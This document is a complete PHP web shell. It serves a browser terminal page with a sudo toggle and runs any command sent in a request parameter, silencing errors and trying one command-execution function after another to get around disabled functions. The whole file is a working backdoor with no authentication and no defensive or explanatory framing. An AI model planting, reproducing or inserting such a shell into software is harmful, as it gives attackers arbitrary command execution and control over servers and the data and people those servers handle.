<?php
@ini_set("display_errors","0");@error_reporting(0);@set_time_limit(0);

$su = isset($_GET["su"]) ? 1 : 0;

if(!isset($_REQUEST["c"])){
?><!DOCTYPE html>
<html>
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>term</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1a1a2e;color:#0f0;font:14px/1.5 monospace;height:100vh;display:flex;flex-direction:column}
#o{flex:1;overflow-y:auto;padding:10px;white-space:pre-wrap;word-break:break-all}
#l{display:flex;padding:8px 10px;background:#16213e;border-top:1px solid #0f3460;align-items:center}
#l s{color:#0f0;margin-right:8px;white-space:nowrap}
#i{flex:1;background:#0f3460;border:none;color:#0f0;font:14px/1.5 monospace;padding:6px 10px;outline:none;border-radius:4px;margin:0 8px}
#i:focus{box-shadow:0 0 5px #0f04}
#t{background:#0a1628;border:1px solid #0f3460;color:#0f0;border-radius:4px;padding:4px 8px;cursor:pointer;font:12px monospace;white-space:nowrap}
#t.on{background:#0f0;color:#000;border-color:#0f0}
::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:#16213e}::-webkit-scrollbar-thumb{background:#0f3460}
</style>
</head>
<body>
<div id="o"><s style=color:#666>Terminal</s><hr style=border-color:#0f3460></div>
<div id="l"><button id="t">sudo ON</button><s>root@itdev:~#</s><input id="i" autofocus/></div>
<script>
var o=document.getElementById("o"),i=document.getElementById("i"),t=document.getElementById("t"),su=true;
t.classList.add("on");
t.onclick=function(){su=!su;t.textContent=su?"sudo ON":"sudo OFF";t.classList.toggle("on");o.innerHTML+="<div><i style=color:#888>"+(su?"sudo ON":"sudo OFF")+"</i></div>";o.scrollTop=o.scrollHeight};
i.addEventListener("keydown",function(e){if(e.key==="Enter"){var c=i.value;i.value="";
o.innerHTML+="<div><b style=color:#ff0>$</b> "+c.replace(/&/g,"&amp;").replace(/</g,"&lt;")+"</div>";
var u=su?"?c="+encodeURIComponent("sudo "+c):"?c="+encodeURIComponent(c);
fetch(u).then(function(r){return r.text()}).then(function(d){
o.innerHTML+=(d?"<pre>"+d.replace(/&/g,"&amp;").replace(/</g,"&lt;")+"</pre>":"<i style=color:#666>no output</i>")+"<hr style=border-color:#0f3460>";
o.scrollTop=o.scrollHeight})}});
</script>
</body>
</html><?php
exit;
}

$x=$_REQUEST["c"];$o="";
$f=@ini_get("disable_functions");if($f!==false)$f=",".str_replace(" ","",$f).",";
if(strpos($f,",proc_open,")===false&&function_exists("proc_open")){
$p=@proc_open($x,[["pipe","r"],["pipe","w"],["pipe","w"]],$i);
if(is_resource($p)){$o=@stream_get_contents($i[1]);@fclose($i[1]);@fclose($i[2]);@proc_close($p);}}
if(!$o&&strpos($f,",shell_exec,")===false&&function_exists("shell_exec"))$o=@shell_exec($x);
if(!$o&&strpos($f,",exec,")===false&&function_exists("exec")){@exec($x,$l);$o=@implode("
",$l);}
if(!$o&&strpos($f,",system,")===false&&function_exists("system")){@ob_start();@system($x);$o=@ob_get_clean();}
if(!$o&&strpos($f,",passthru,")===false&&function_exists("passthru")){@ob_start();@passthru($x);$o=@ob_get_clean();}
if(!$o&&strpos($f,",popen,")===false&&function_exists("popen")){$h=@popen($x,"r");if(is_resource($h)){$o=@stream_get_contents($h);@pclose($h);}}
echo $o?$o:" ";die();